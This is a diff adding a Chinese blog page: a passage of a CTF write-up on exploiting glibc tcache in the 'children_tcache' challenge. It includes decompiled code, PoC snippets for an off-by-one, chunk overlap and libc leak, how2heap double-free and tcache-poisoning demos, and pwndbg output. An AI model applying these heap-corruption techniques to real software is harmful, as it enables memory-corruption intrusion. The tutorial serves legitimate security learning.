@@ -1,0 +1,1378 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">在debug中学tcache | nepire的舰队</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "艦隊nepire";
+  mashiro_option.author_name = "nepire";
+  mashiro_option.site_url = "https://nepire.github.io/";
+  mashiro_option.v_appId = "aAE6NeF5HCQ0WM9kYD4ywdDw-gzGzoHsz";
+  mashiro_option.v_appKey = "EEpyRysaKmv7aOJjR1o9E4Eq";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "/images/cover/(0).jpg,/images/cover/(1).jpg,/images/cover/(2).jpg,/images/cover/(3).jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+</head>
+</html>
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dot">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://nepire.github.io/">
+          <img src="/images/title.ico">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>渴求着能撼动世界的力量</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="github">
+                    <img src="/images/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="sina">
+                    <img src="/images/social/sina.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="wangyiyun">
+                    <img src="/images/social/wangyiyun.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="zhihu">
+                    <img src="/images/social/zhihu.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="email">
+                    <img src="/images/social/email.svg">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="/images/social/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="/img/custom/wechat.jpg">
+                  </div>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">艦隊</span>
+            <span class="shironeko">nepire</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/技术/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/生活/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          生活
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/资源/">
+                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                          资源
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/tags/悦读/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          书单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/bangumi/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          番组
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/music/">
+                          <i class="fa fa-headphones" aria-hidden="true"></i>
+                          歌单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/图集/">
+                          <i class="fa fa-photo" aria-hidden="true"></i>
+                          图集
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/comment/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+                    留言板
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/links/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+                    友人帐
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/donate/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+                    赞赏
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/theme-sakura/">
+                          <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                          主题
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/lab/">
+                          <i class="fa fa-cogs" aria-hidden="true"></i>
+                          Lab
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/client/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
+                    客户端
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/atom.xml">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+                    RSS
+                  </span>
+                </a>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+          <header class="entry-header">
+            <h1 class="entry-title">在debug中学tcache</h1>
+            <p class="entry-census">nepire&nbsp;·&nbsp;2019-11-5&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <p>最近比赛Pwn的libc版本越来越多2.26以上的了，也就相当于多了不少tcache相关的题目，于是最近恶补了一波tcache机制相关的东西，并记录下tcache相关题目的调试</p>
+<p>本文首发于先知社区<a href="https://xz.aliyun.com/t/3419" target="_blank" rel="noopener">在Debug中学Tcache</a></p>
+<h3 id="tcache简介"><a href="#tcache简介" class="headerlink" title="tcache简介"></a>tcache简介</h3><p>tcache（thread local caching）是glibc在2.26版本新出现的一种内存管理机制，它优化了分配效率却也降低了安全性，一些漏洞的利用条件变得容易了许多</p>
+<p>首先我们先看下tcache新引入的两个数据结构tcache_entry 和tcache_perthread_struct</p>
+<pre><code class="c">/* We overlay this structure on the user-data portion of a chunk when
+   the chunk is stored in the per-thread cache.  */
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+} tcache_entry;
+
+/* There is one of these for each thread, which contains the
+   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping
+   overall size low is mildly important.  Note that COUNTS and ENTRIES
+   are redundant (we could have just counted the linked list each
+   time), this is for performance reasons.  */
+typedef struct tcache_perthread_struct
+{
+  char counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+
+static __thread tcache_perthread_struct *tcache = NULL;
+</code></pre>
+<p>这里简单的说明一下tcache和fastbin的结构都很相像也都是单链表结构，明显的不同是fastbin每个bins有10个块而tcache是7个并且tcache的优先级要高于fastbin，相当于只有tcache放不下了才会放入fastbin</p>
+<pre><code class="c">(0x20)   tcache_entry[0]: 0x55ea7bc0d320 --&gt; 0x55ea7bc0d300 --&gt; 0x55ea7bc0d2e0 --&gt;
+ 0x55ea7bc0d2c0 --&gt; 0x55ea7bc0d2a0 --&gt; 0x55ea7bc0d280 --&gt; 0x55ea7bc0d260
+</code></pre>
+<p>我们先看下题目的基本信息，这里我是用了自己写的一个pwn环境来实现tcache的调试具体链接会在末尾放出</p>
+<pre><code class="bash">➜  tcache file children_tcache
+children_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ebf73572ad77a035a366578bf87c6aabc6a235a1, stripped
+➜  tcache checksec children_tcache
+[*] &#39;/home/ctf/process/tcache/children_tcache&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+</code></pre>
+<p>64位防护全开的程序，真的刺激，我们看下程序干了些什么</p>
+<pre><code class="bash">➜  tcache ./children_tcache
+$$$$$$$$$$$$$$$$$$$$$$$$$$$
+🍊    Children Tcache    🍊
+$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$   1. New heap           $
+$   2. Show heap          $
+$   3. Delete heap        $
+$   4. Exit               $
+$$$$$$$$$$$$$$$$$$$$$$$$$$$
+Your choice: 1
+Size:12
+Data:aaaa
+</code></pre>
+<p>一个基本的菜单类型的pwn题，在简单的审计过后就能发现漏洞，首先我们看下程序本身产生的问题</p>
+<pre><code class="c">void new()
+{
+  signed int i; // [rsp+Ch] [rbp-2034h]
+  char *note_chunk; // [rsp+10h] [rbp-2030h]
+  unsigned __int64 size; // [rsp+18h] [rbp-2028h]
+  char buf; // [rsp+20h] [rbp-2020h]
+  unsigned __int64 v4; // [rsp+2038h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  memset(&amp;buf, 0, 0x2010uLL);
+  for ( i = 0; ; ++i )
+  {
+    if ( i &gt; 9 )
+    {
+      puts(&quot;:(&quot;);
+      return;
+    }
+    if ( !note[i] )
+      break;
+  }
+  printf(&quot;Size:&quot;);
+  size = input();
+  if ( size &gt; 0x2000 )
+    exit(-2);
+  note_chunk = malloc(size);
+  if ( !note_chunk )
+    exit(-1);
+  printf(&quot;Data:&quot;);
+  read_chk_input(&amp;buf, size);
+  strcpy(note_chunk, &amp;buf);
+  note[i] = note_chunk;
+  note_size[i] = size;
+}
+</code></pre>
+<p>我们知道strcpy在拷贝字符串时连末尾的’\0’也会一起拷贝，假设我们的字符串长度刚好和所分配给它的长度相等，那么就可能会造成null-byte-off-by-one漏洞，我们简单的验证一下</p>
+<pre><code class="python">#poc
+new(0x10,&#39;a&#39;*8)
+new(0x110,&#39;aaaa&#39;)
+raw_input()
+
+free(0)
+new(0x18,&#39;a&#39;*0x18)
+raw_input()
+</code></pre>
+<pre><code class="bash">pwndbg&gt; parseheap
+addr                prev                size                 status              fd                bk
+0x565258e29000      0x0                 0x250                Used                None              None
+0x565258e29250      0x0                 0x20                 Used                None              None
+0x565258e29270      0x0                 0x110                Used                None              None
+
+pwndbg&gt; parseheap
+addr                prev                size                 status              fd                bk   
+0x565258e29000      0x0                 0x250                Used                None              None
+0x565258e29250      0x0                 0x20                 Freed 0x61616161616161610x6161616161616161
+0x565258e29270      0x6161616161616161  0x100                Freed         0x62626262               0x0
+Corrupt ?! (size == 0) (0x565258e29370)
+
+</code></pre>
+<pre><code class="bash">pwndbg&gt; x/8x 0x565258e29250
+0x565258e29250:    0x0000000000000000    0x0000000000000021
+0x565258e29260:    0x6161616161616161    0x0000000000000000
+0x565258e29270:    0x0000000000000000    0x0000000000000111
+0x565258e29280:    0x0000000062626262    0x0000000000000000
+
+pwndbg&gt; x/8x 0x565258e29250
+0x565258e29250:    0x0000000000000000    0x0000000000000021
+0x565258e29260:    0x6161616161616161    0x6161616161616161
+0x565258e29270:    0x6161616161616161    0x0000000000000100   ==&gt;这里原本应该为0x111但最末尾的0x11被0x00覆盖了
+0x565258e29280:    0x0000000062626262    0x0000000000000000
+</code></pre>
+<p>由于这题的出题人用0xda填充整个chunk，所以我们不能直接伪造pre_size来overlapping</p>
+<pre><code class="c">void delete()
+{
+  unsigned __int64 idx; // [rsp+8h] [rbp-8h]
+
+  printf(&quot;Index:&quot;);
+  idx = input();
+  if ( idx &gt; 9 )
+    exit(-3);
+  if ( note[idx] )
+  {
+    memset(note[idx], 0xDA, note_size[idx]);
+    free(note[idx]);
+    note[idx] = 0LL;
+    note_size[idx] = 0LL;
+  }
+  puts(&quot;:)&quot;);
+}
+</code></pre>
+<p>但我们刚刚才验证的null byte off-by-one溢出的字节为\x00，所以我们可以通过反复的利用这个把pre_size位清0来构造overlapping</p>
+<pre><code class="python">#poc
+new(0x10,&#39;aaaa&#39;)
+new(0x110,&#39;aaaa&#39;)
+free(0)
+for i in range(8):
+    new(0x10-i,&#39;a&#39;*(0x10-i))
+    free(0)
+raw_input()
+</code></pre>
+<pre><code class="bash">pwndbg&gt; parseheap
+addr                prev                size                 status              fd                bk
+0x560894f1f000      0x0                 0x20                 Freed 0x61616161616161610x6161616161616161
+0x560894f1f020      0x130               0x100                Freed         0x61616161               0x0
+Corrupt ?! (size == 0) (0x560894f1f120)
+pwndbg&gt; x/8x 0x560894f1f000
+0x560894f1f000:    0x0000000000000000    0x0000000000000021
+0x560894f1f010:    0x6161616161616161    0x6161616161616161
+0x560894f1f020:    0x0000000000000130    0x0000000000000100
+0x560894f1f030:    0x0000000061616161    0x0000000000000000
+</code></pre>
+<p>接着我们需要libc_base来方便后面的操作，我们可以看到在new中对size的检验范围十分大，这时我们可以通过unsort_bin_attack来泄露一个紧贴libc的地址 ，之后我们可以通过调试得到这个地址与libc_base的偏移，就相当与泄露出了libc_base</p>
+<pre><code class="c">printf(&quot;Size:&quot;);
+  size = input();
+  if ( size &gt; 0x2000 )
+    exit(-2);
+  note_chunk = malloc(size);
+</code></pre>
+<p>我们简单的做个unsort_bin_attack尝试把这个地址写入到chunk上</p>
+<pre><code class="python">#poc
+new(0x500,&#39;aaaaa&#39;)
+new(0x10,&#39;bbbb&#39;)
+free(1)
+free(0)
+</code></pre>
+<pre><code class="bash">pwndbg&gt; parseheap
+addr                prev                size                 status              fd                bk
+0x55763fe59000      0x0                 0x250                Used                None              None
+0x55763fe59250      0x0                 0x510                Freed     0x7f74dac85c78    0x7f74dac85c78
+0x55763fe59760      0x510               0x20                 Used                None              None
+pwndbg&gt; x/8x 0x55763fe59250
+0x55763fe59250:    0x0000000000000000    0x0000000000000511
+0x55763fe59260:    0x00007f74dac85c78    0x00007f74dac85c78 &lt;==
+0x55763fe59270:    0x0000000000000000    0x0000000000000000
+0x55763fe59280:    0xdadadadadadadada    0xdadadadadadadada
+</code></pre>
+<p>有了这些条件后我们便可以去泄露libc了，我们用图演示下流程</p>
+<p><img src="https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__%E5%9C%A8DEBUG%E4%B8%AD%E5%AD%A6%E4%B9%A0tcache%E6%9C%BA%E5%88%B6.assets/1542258403288.png" alt="1542258403288"></p>
+<pre><code class="bash">#free before
+pwndbg&gt; parseheap
+addr                prev                size                 status              fd                bk
+0x55a2d6e3a000      0x0                 0x250                Used                None              None
+0x55a2d6e3a250      0x0                 0x510                Freed     0x7fba63b37c78    0x7fba63b37c78
+0x55a2d6e3a760      0x510               0x30                 Freed 0x61616161616161610x6161616161616161
+0x55a2d6e3a790      0x540               0x500                Used                None              None
+0x55a2d6e3ac90      0x0                 0x20                 Used                None              None
+pwndbg&gt; x/8x 0x55a2d6e3a760
+0x55a2d6e3a760:    0x0000000000000510    0x0000000000000030
+0x55a2d6e3a770:    0x6161616161616161    0x6161616161616161
+0x55a2d6e3a780:    0x6161616161616161    0x6161616161616161
+0x55a2d6e3a790:    0x0000000000000540    0x0000000000000500
+pwndbg&gt; x/8x 0x55a2d6e3a790
+0x55a2d6e3a790:    0x0000000000000540    0x0000000000000500
+0x55a2d6e3a7a0:    0x0000000063636363    0x0000000000000000
+0x55a2d6e3a7b0:    0x0000000000000000    0x0000000000000000
+0x55a2d6e3a7c0:    0x0000000000000000    0x0000000000000000
+
+#free after
+pwndbg&gt; parseheap
+addr                prev                size                 status              fd                bk
+0x563204289000      0x0                 0x250                Used                None              None
+0x563204289250      0x0                 0xa40                Freed     0x7f01905acc78    0x7f01905acc78
+0x563204289c90      0xa40               0x20                 Used                None              None
+pwndbg&gt; x/8x 0x563204289250
+0x563204289250:    0x0000000000000000    0x0000000000000a41
+0x563204289260:    0x00007f01905acc78    0x00007f01905acc78
+0x563204289270:    0x0000000000000000    0x0000000000000000
+0x563204289280:    0xdadadadadadadada    0xdadadadadadadada
+pwndbg&gt;
+</code></pre>
+<p> 这时我们再新建一个chunk分配大小和chunk0一样时，chunk就会分配到chunk0所在的位置，这时我们show(0)即可leak_libc</p>
+<p>这样我们所有的前置工作就做好了，接着就是通过tcache_dup和tcache_poisoning来getshell了</p>
+<p>首先我们先通过how2heap了解下</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+//tcache_dup
+int main()
+{
+    fprintf(stderr, &quot;This file demonstrates a simple double-free attack with tcache.\n&quot;);
+
+    fprintf(stderr, &quot;Allocating buffer.\n&quot;);
+    int *a = malloc(8);
+
+    fprintf(stderr, &quot;malloc(8): %p\n&quot;, a);
+    fprintf(stderr, &quot;Freeing twice...\n&quot;);
+    free(a);
+    free(a);
+
+    fprintf(stderr, &quot;Now the free list has [ %p, %p ].\n&quot;, a, a);
+    fprintf(stderr, &quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;, malloc(8), malloc(8));
+
+    return 0;
+}
+</code></pre>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+// tcache poisoning
+int main()
+{
+    &quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into&quot;
+    &quot;returning a pointer to an arbitrary location (in this case, the stack).&quot;
+    &quot;The attack is very similar to fastbin corruption attack.&quot;
+
+    size_t stack_var;
+    fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, (char *)&amp;stack_var);
+
+    &quot;Allocating 1 buffer.&quot;
+    intptr_t *a = malloc(128);
+    fprintf(stderr, &quot;malloc(128): %p\n&quot;, a);
+    &quot;Freeing the buffer...&quot;
+    free(a);
+
+    fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, a);
+    fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;
+        &quot;to point to the location to control (%p).\n&quot;, sizeof(intptr_t), a, &amp;stack_var);
+    a[0] = (intptr_t)&amp;stack_var;
+
+    fprintf(stderr, &quot;1st malloc(128): %p\n&quot;, malloc(128));
+    fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, &amp;stack_var);
+
+    intptr_t *b = malloc(128);
+    fprintf(stderr, &quot;2nd malloc(128): %p\n&quot;, b);
+    &quot;We got the control&quot;
+    return 0;
+}
+</code></pre>
+<p>我们可以很明显的感受到tcache_dup就是弱化版的fastbin_double_free，我们先看一下源码相关的函数</p>
+<pre><code class="c">tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+      tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+      assert (tc_idx &lt; TCACHE_MAX_BINS);
+      e-&gt;next = tcache-&gt;entries[tc_idx];
+      tcache-&gt;entries[tc_idx] = e;
+      ++(tcache-&gt;counts[tc_idx]);
+}
+</code></pre>
+<p>这就是我之前所说过引入tcache机制降低了安全性的一个体现，本来应该要有tcache-&gt;counts[tc_idx] 的相关检验，却为提升效率而去掉了，这也侧面的说明安全和性能处在一个此消彼长的状态</p>
+<p>我们简单的调试下tcache_dup</p>
+<pre><code class="bash">
+pwndbg&gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x55a661cd5270 (size : 0x20d90)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x0
+(0x20)   tcache_entry[0]: 0x55a661cd5260 --&gt; 0x55a661cd5260 (overlap chunk with 0x55a661cd5250(freed) )
+
+</code></pre>
+<p>我们直接free两次同一个chunk，就能直接得到两个指向同一块内存区域的指针，这无疑比正常在fastbin下的double free简易许多</p>
+<p>接着我们看下tcache_poisoning，简单来说tcache_poisoning就是一个通过覆盖tcache_next就直接可以malloc到任意地址去将其覆盖为one_gadget或是别的东西去进行利用的一个很万金油的用法，我们调试下how2heap给的程序</p>
+<pre><code class="bash">pwndbg&gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x55a464be82e0 (size : 0x20d20)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x0
+(0x90)   tcache_entry[7]: 0x55a464be8260
+
+</code></pre>
+<p>它先往tcache里面放了一个0x80的chunk，然后我们再看下修改了tcache_next后的tcache_entry是怎么样的</p>
+<pre><code class="bash">────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────
+   20     fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, a);
+   21     fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;
+   22         &quot;to point to the location to control (%p).\n&quot;, sizeof(intptr_t), a, &amp;stack_var);
+   23     a[0] = (intptr_t)&amp;stack_var;
+   24
+ ► 25     fprintf(stderr, &quot;1st malloc(128): %p\n&quot;, malloc(128));
+   26     fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, &amp;stack_var);
+   27
+   28     intptr_t *b = malloc(128);
+   29     fprintf(stderr, &quot;2nd malloc(128): %p\n&quot;, b);
+   30     fprintf(stderr, &quot;We got the control\n&quot;);
+────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
+00:0000│ rdx rsp  0x7ffe99bc1bb0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push   r15
+01:0008│          0x7ffe99bc1bb8 —▸ 0x55a464be8260 —▸ 0x7ffe99bc1bb0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push   r15
+02:0010│          0x7ffe99bc1bc0 —▸ 0x7ffe99bc1cb0 ◂— 0x1
+03:0018│          0x7ffe99bc1bc8 ◂— 0xad94ca33a5db2a00
+04:0020│ rbp      0x7ffe99bc1bd0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push   r15
+05:0028│          0x7ffe99bc1bd8 —▸ 0x7f6dd0a631c1 (__libc_start_main+241) ◂— mov    edi, eax
+06:0030│          0x7ffe99bc1be0 ◂— 0x40000
+07:0038│          0x7ffe99bc1be8 —▸ 0x7ffe99bc1cb8 —▸ 0x7ffe99bc2912 ◂— 0x74632f656d6f682f (&#39;/home/ct&#39;)
+pwndbg&gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x55a464be82e0 (size : 0x20d20)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x0
+(0x90)   tcache_entry[7]: 0x55a464be8260 --&gt; 0x7ffe99bc1bb0 --&gt; 0x55a4635689a0
+</code></pre>
+<p>我们可以看见设置的栈地址放在了tcache_entry的第二个堆，这时我们只要new两个0x80大小的chunk就可以控制tcache_next所在的空间</p>
